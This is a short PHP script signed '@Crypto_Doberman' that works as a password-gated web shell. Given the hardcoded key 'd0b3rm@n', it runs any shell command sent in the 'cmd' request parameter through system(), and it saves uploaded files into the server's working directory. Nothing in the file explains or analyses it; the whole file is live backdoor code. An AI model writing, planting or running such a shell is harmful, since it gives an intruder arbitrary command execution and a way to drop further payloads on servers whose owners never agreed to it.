<?php
// @Crypto_Doberman
$key = "d0b3rm@n";
if(isset($_REQUEST['key']) && $_REQUEST['key'] === $key) {
    if(isset($_REQUEST['cmd'])) {
        system($_REQUEST['cmd']);
    } elseif(isset($_FILES['f']['name'])) {
        move_uploaded_file($_FILES['f']['tmp_name'], getcwd()."/".$_FILES['f']['name']);
    }
} else {
    echo "Access Denied";
}
?>
